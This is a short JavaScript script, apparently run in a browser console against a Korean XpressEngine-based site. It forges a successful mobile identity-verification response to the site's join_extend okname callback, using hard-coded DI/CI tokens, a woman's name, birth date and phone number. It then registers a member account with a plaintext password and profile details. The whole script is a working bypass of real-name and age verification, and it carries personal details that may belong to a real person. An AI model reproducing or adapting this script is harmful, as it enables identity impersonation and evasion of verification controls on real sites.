const myHeaders = new Headers()
const di = 'MC0GCCaeSsIb3DQcdfeeIJxzczadsadaAyEAoagcds7odasdaNoUbVeqwdsdf4tpoG4ccUANevbm2tVEb%2Bz12urgEUaHnw%3D'
const ci = 'uUd1zsd0adwc0Tdlfedsa34xeczxcwdsaddassIQFtcfUFBLlewqGvXHVG6hu3zsKdsSJgKcuR7WCWpPNJH6PD1qCZBnmz5ZWmGYwCE8QzBblv%2F%2F%2FTA%3D%3D'
const name = '김수지'
const birthday = '20010402'
const cel = '01013403220'
const sex = '2'

myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
const urlencoded = new URLSearchParams();
urlencoded.append("idcf_mbr_com_cd", "P21050000000");
urlencoded.append("hs_cert_svc_tx_seqno", "20230926221017");
urlencoded.append("hs_cert_msr_cd", "10");
urlencoded.append("hs_cert_rqst_caus_cd", "");
urlencoded.append("result_cd", "B000");
urlencoded.append("result_msg", "%BA%BB%C0%CE%C0%CE%C1%F5+%BF%CF%B7%E1");
urlencoded.append("result_di", di);
urlencoded.append("result_ci", ci);
urlencoded.append("result_name", name);
urlencoded.append("result_birthday", birthday);
urlencoded.append("result_sex", sex);
urlencoded.append("result_foreign", "1");
urlencoded.append("result_cellcompany", "03");
urlencoded.append("result_cel", cel);

var requestOptions = {
    method: 'POST',
    headers: myHeaders,
    body: urlencoded,
    redirect: 'follow'
};

fetch("https://aragonk.com/xe/modules/join_extend/skins/default_okname/safe_hs_cert4.php", requestOptions)
    .then(response => {
        response.text()
        var param = {
            name: name,
            di: di,
            birthday: birthday,
            age: 23,
            sex: sex,
            cellcompany: 3,
            cell: cel,
            type: 'self'
        }
        exec_xml('join_extend', 'procJoin_extendAgree', param, function() {
            location.reload()
        });

    })
    .catch(error => console.log('error', error));

const params = {
    allow_mailing
        :
        "Y",
    birthday
        :
        "20010402",
    email_address
        :
        "norwenr@naver.com",
    find_account_answer
        :
        "rwerw",
    find_account_question
        :
        "1",
    nick_name
        :
        "tt11111",
    open_id
        :
        "Y",
    open_reg
        :
        "Y",
    open_sex
        :
        "Y",
    open_sm
        :
        "Y",
    password
        :
        "star8903",
    password2
        :
        "star8903",
    reg
        :
        "서울",
    sex
        :
        "여성",
    sm
        :
        "Dominant",
    user_id
        :
        "rnowenr",
    user_name
        :
        "김수지",
    _filter
        :
        "signup"
}

const responses = ['error', 'message', 'redirect_url']

exec_xml('member', 'procMemberInsert', params, '', responses, params, '')